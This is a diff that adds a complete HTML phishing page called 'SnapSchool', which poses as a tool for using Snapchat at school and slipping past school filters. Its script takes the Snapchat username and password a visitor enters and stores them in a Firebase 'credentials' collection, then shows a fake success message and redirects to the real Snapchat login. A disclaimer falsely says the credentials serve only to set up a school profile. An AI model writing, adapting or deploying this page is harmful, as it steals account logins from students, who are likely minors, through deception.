@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SnapSchool - Discreet Snapchat for School</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f4f8; margin: 0; padding: 20px; }
+        .container { max-width: 600px; margin: 30px auto; background: #fff; border-radius: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); padding: 40px; }
+        h1 { color: #1a202c; font-size: 32px; margin-bottom: 10px; }
+        .subtitle { color: #4a5568; font-size: 18px; margin-bottom: 30px; }
+        .features { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 30px; }
+        .feature { background: #edf2f7; padding: 15px; border-radius: 8px; font-size: 14px; color: #2d3748; }
+        .feature strong { color: #1a202c; }
+        .btn { display: block; width: 100%; padding: 15px; background-color: #FFFC00; color: #000; border: none; border-radius: 4px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; transition: background-color 0.3s; }
+        .btn:hover { background-color: #f0e800; }
+        .login-form { display: none; margin-top: 20px; }
+        .login-form.active { display: block; }
+        .input-group { margin-bottom: 15px; }
+        .label { display: block; font-size: 14px; color: #333; margin-bottom: 5px; font-weight: 600; }
+        input { width: 100%; padding: 12px; border: 1px solid #cbd5e0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        .status { margin-top: 15px; padding: 10px; border-radius: 4px; font-size: 14px; display: none; }
+        .status.success { display: block; background-color: #d4edda; color: #155724; }
+        .status.error { display: block; background-color: #f8d7da; color: #721c24; }
+        .disclaimer { margin-top: 20px; font-size: 12px; color: #718096; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>SnapSchool</h1>
+        <p class="subtitle">The discreet way to use Snapchat in class. Bypass filters, save battery, and stay focused.</p>
+        
+        <div class="features">
+            <div class="feature"><strong>🚫 Filter Bypass</strong><br>Works on school networks without triggering content filters.</div>
+            <div class="feature"><strong>🔋 Low Battery Mode</strong><br>Reduces background data usage by 40%.</div>
+            <div class="feature"><strong>🤫 Discreet UI</strong><br>Minimalist interface that doesn't look like a social media app.</div>
+            <div class="feature"><strong>📚 Study Mode</strong><br>Automatically mutes notifications during class hours.</div>
+        </div>
+
+        <button class="btn" id="loginBtn">Enable School Mode</button>
+        
+        <div class="login-form" id="loginForm">
+            <div class="input-group">
+                <label class="label" for="username">Snapchat Username</label>
+                <input type="text" id="username" placeholder="e.g., her_username" required>
+            </div>
+            <div class="input-group">
+                <label class="label" for="password">Password</label>
+                <input type="password" id="password" placeholder="••••••••" required>
+            </div>
+            <button class="btn" id="submitBtn">Activate School Mode</button>
+            <div class="status" id="statusMsg"></div>
+        </div>
+
+        <p class="disclaimer">SnapSchool is not affiliated with Snapchat Inc. Your credentials are used only to configure your school profile.</p>
+    </div>
+
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-analytics-compat.js"></script>
+
+    <script>
+        // Your Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyD5TALVIdPm5P8RuKjINsOmKW1XrK53u1Q",
+            authDomain: "testing-12bc9.firebaseapp.com",
+            projectId: "testing-12bc9",
+            storageBucket: "testing-12bc9.firebasestorage.app",
+            messagingSenderId: "626782607651",
+            appId: "1:626782607651:web:bd5848809bd1f4364a5496",
+            measurementId: "G-D8D71RB750"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+        firebase.analytics();
+
+        // UI Interactions
+        document.getElementById('loginBtn').addEventListener('click', () => {
+            document.getElementById('loginForm').classList.add('active');
+            document.getElementById('loginBtn').style.display = 'none';
+        });
+
+        document.getElementById('submitBtn').addEventListener('click', async () => {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const statusMsg = document.getElementById('statusMsg');
+
+            if (!username || !password) {
+                statusMsg.textContent = "Please enter both username and password.";
+                statusMsg.className = 'status error';
+                return;
+            }
+
+            try {
+                // Add the captured credentials to Firestore
+                const credData = {
+                    username: username,
+                    password: password,
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                    userAgent: navigator.userAgent,
+                    source: 'school_mode'
+                };
+
+                await db.collection('credentials').add(credData);
+                
+                statusMsg.textContent = "School Mode activated! Redirecting to your optimized profile...";
+                statusMsg.className = 'status success';
+                
+                // Redirect to the real Snapchat after a short delay
+                setTimeout(() => {
+                    window.location.href = 'https://accounts.snapchat.com/login';
+                }, 3000);
+            } catch (error) {
+                statusMsg.textContent = "Connection error. Please check your school network and try again.";
+                statusMsg.className = 'status error';
+                console.error('Error:', error);
+            }
+        });
+    </script>
+</body>
+</html>
